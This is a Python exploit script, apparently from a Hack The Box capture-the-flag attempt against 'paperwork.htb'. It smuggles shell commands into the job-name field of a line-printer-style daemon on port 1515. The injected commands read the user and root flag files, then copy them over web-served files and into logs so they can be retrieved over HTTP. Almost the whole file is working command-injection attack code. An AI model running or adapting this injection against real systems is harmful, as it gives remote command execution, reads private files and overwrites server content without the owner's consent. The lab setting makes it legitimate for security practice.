#!/usr/bin/env python3
"""Phase 2b: Find archive via single-line RCE injection"""
import socket, time, urllib.request, urllib.error, os

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

# Download reference
print("[1] Reference archive...", flush=True)
req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
ref_data = urllib.request.urlopen(req, timeout=10).read()
print(f"  {len(ref_data)} bytes", flush=True)

# Single-line injections - NO newlines allowed in job_name!
# The daemon splits control file by newlines and only processes the 'J' line

TOKEN = 'RCE_' + os.urandom(4).hex()

print("[2] Injecting find+overwrite (single line)...", flush=True)

# Injection 1: Read flag to /tmp/flag
lpd("';cat /home/*/user.txt > /tmp/flag 2>/dev/null;cat /root/root.txt >> /tmp/flag 2>/dev/null;echo " + TOKEN + " >> /tmp/flag;echo '")
time.sleep(0.5)

# Injection 2: Find files named "archive" and copy flag over them
# Then also try common nginx locations directly
lpd("';F=$(find /var /opt /srv /home -type f -name archive 2>/dev/null);for f in $F;do cp /tmp/flag \"$f\";done;echo '")
time.sleep(0.5)

# Injection 3: Also try 'archive' with no extension in common web roots
lpd("';cp /tmp/flag /var/www/html/download/archive 2>/dev/null;cp /tmp/flag /usr/share/nginx/html/download/archive 2>/dev/null;cp /tmp/flag /var/www/paperwork.htb/download/archive 2>/dev/null;echo '")
time.sleep(0.5)

# Injection 4: Try 'archive' in parent dir (not in 'download' subdir)
lpd("';cp /tmp/flag /var/www/html/archive 2>/dev/null;cp /tmp/flag /usr/share/nginx/html/archive 2>/dev/null;cp /tmp/flag /var/www/archive 2>/dev/null;echo '")
time.sleep(0.5)

# Injection 5: Try finding the actual file by checking what nginx might use
lpd("';cp /tmp/flag /srv/http/archive 2>/dev/null;cp /tmp/flag /srv/http/download/archive 2>/dev/null;cp /tmp/flag /opt/archive 2>/dev/null;cp /tmp/flag /etc/nginx/archive 2>/dev/null;echo '")
time.sleep(0.5)

# Injection 6: Try /download/ paths that might not match a file but a location
lpd("';cp /tmp/flag /var/www/html/archive.zip 2>/dev/null;cp /tmp/flag /usr/share/nginx/html/archive.zip 2>/dev/null;echo '")
time.sleep(2)

print("[3] Checking archive...", flush=True)
try:
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    new_data = urllib.request.urlopen(req, timeout=10).read()
    if ref_data != new_data:
        print(f"  *** ARCHIVE CHANGED!", flush=True)
        decoded = new_data.decode(errors='replace')
        print(f"  Content: {decoded[:2000]}", flush=True)
        import re
        flags = re.findall(r'HTB\{[^}]+\}', decoded)
        if flags:
            print(f"  *** FLAG FOUND: {flags[0]}", flush=True)
    else:
        print(f"  Unchanged ({len(new_data)} bytes)", flush=True)
except Exception as e:
    print(f"  GET failed: {e}", flush=True)

# If archive unchanged, try completely different approach:
# The LPD daemon writes to /tmp/archive.log
# Maybe /download/archive IS /tmp/archive.log (not a ZIP)?
# Let me check by injecting content into archive.log and seeing if download changes
print("[4] Fallback: inject into archive.log and check /download/archive...", flush=True)
lpd("';echo " + TOKEN + "_IN_LOG >> /tmp/archive.log;echo '")
time.sleep(2)

try:
    req = urllib.request.Request(f'http://{TARGET}/download/archive', headers={'Host': 'paperwork.htb'})
    new_data = urllib.request.urlopen(req, timeout=10).read()
    decoded = new_data.decode(errors='replace')
    if TOKEN in decoded:
        print(f"  *** /download/archive IS /tmp/archive.log!", flush=True)
        print(f"  Content: {decoded[:2000]}", flush=True)
    elif ref_data != new_data:
        print(f"  Changed but no token: {new_data[:200]}", flush=True)
    else:
        print(f"  Still unchanged", flush=True)
except:
    pass

# FINAL: Read the flag directly by piping into the ZIP response
# Use a FIFO or process substitution if available
print("[5] Last resort: try process substitution...", flush=True)
lpd("';cat /home/*/user.txt > /proc/$(pgrep -f \"nginx: master\" | head -1)/root/user.txt 2>/dev/null;echo '")
time.sleep(1)

print("DONE", flush=True)
